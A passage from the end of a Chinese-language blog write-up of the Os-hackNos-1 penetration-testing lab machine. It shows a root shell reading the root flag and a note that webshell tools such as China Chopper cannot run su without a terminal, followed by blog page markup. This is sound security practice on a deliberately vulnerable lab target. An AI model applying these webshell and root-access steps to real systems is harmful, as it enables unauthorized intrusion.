+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">root@hackNos:/var/www# cd ~</span><br><span class="line">cd ~</span><br><span class="line">root@hackNos:~# ls</span><br><span class="line">ls</span><br><span class="line">root.txt</span><br><span class="line">root@hackNos:~# cat root.txt</span><br><span class="line">cat root.txt</span><br><span class="line">    _  _                              _   </span><br><span class="line">  _| || |_                           | |  </span><br><span class="line"> |_  __  _|______  _ __  ___    ___  | |_ </span><br><span class="line">  _| || |_|______|| &#x27;__|/ _ \  / _ \ | __|</span><br><span class="line"> |_  __  _|       | |  | (_) || (_) || |_ </span><br><span class="line">   |_||_|         |_|   \___/  \___/  \__|</span><br><span class="line">                                          </span><br><span class="line">                                          </span><br><span class="line"></span><br><span class="line">MD5-HASH : bae11ce4f67af91fa58576c1da2aad4b</span><br><span class="line"></span><br><span class="line">Author : Rahul Gehlaut</span><br><span class="line"></span><br><span class="line">Linkedin : https://www.linkedin.com/in/rahulgehlaut/</span><br><span class="line"></span><br><span class="line">Blog : www.hackNos.com</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>使用菜刀等webshell不能切换，因为su命令必须在终端中执行</p>
+<p>su: must be run from a terminal</p>
+<p><img src="/project/2023/10/19/Os-hackNos-1/image-20230628232523339.png" alt="image-20230628232523339"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://bilibiliganb.github.io/project">bilibiliganb</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://bilibiliganb.github.io/project/2023/10/19/Os-hackNos-1/">https://bilibiliganb.github.io/project/2023/10/19/Os-hackNos-1/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://bilibiliganb.github.io/project" target="_blank">Life lover</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/project/img/avatar.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/project/2023/10/19/hello-world/" title="hello-world"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">hello-world</div></div></a></div><div class="next-post pull-right"><a href="/project/2023/10/19/trollcave-v1-2/" title="trollcave-v1-2"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">trollcave-v1-2</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/project/img/avatar.png" onerror="this.onerror=null;this.src='/project/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">bilibiliganb</div><div class="author-info__description">Some sec notes</div></div><div class="card-info-data site-data is-center"><a href="/project/archives/"><div class="headline">文章</div><div class="length-num">4</div></a><a href="/project/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/project/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Os-hackNos-1"><span class="toc-number">1.</span> <span class="toc-text">Os-hackNos-1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA%E9%85%8D%E7%BD%AE"><span class="toc-number">1.1.</span> <span class="toc-text">靶机配置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F"><span class="toc-number">1.2.</span> <span class="toc-text">进行渗透</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="toc-number">1.3.</span> <span class="toc-text">注意事项</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/project/2023/10/19/Os-ByteSec/" title="Os-ByteSec">Os-ByteSec</a><time datetime="2023-10-19T10:10:06.000Z" title="发表于 2023-10-19 18:10:06">2023-10-19</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/project/2023/10/19/hello-world/" title="hello-world">hello-world</a><time datetime="2023-10-19T10:10:06.000Z" title="发表于 2023-10-19 18:10:06">2023-10-19</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/project/2023/10/19/Os-hackNos-1/" title="Os-hackNos-1">Os-hackNos-1</a><time datetime="2023-10-19T10:10:06.000Z" title="发表于 2023-10-19 18:10:06">2023-10-19</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/project/2023/10/19/trollcave-v1-2/" title="trollcave-v1-2">trollcave-v1-2</a><time datetime="2023-10-19T10:10:06.000Z" title="发表于 2023-10-19 18:10:06">2023-10-19</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By bilibiliganb</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/project/js/utils.js"></script><script src="/project/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/project/js/search/local-search.js"></script></div></div></body></html>
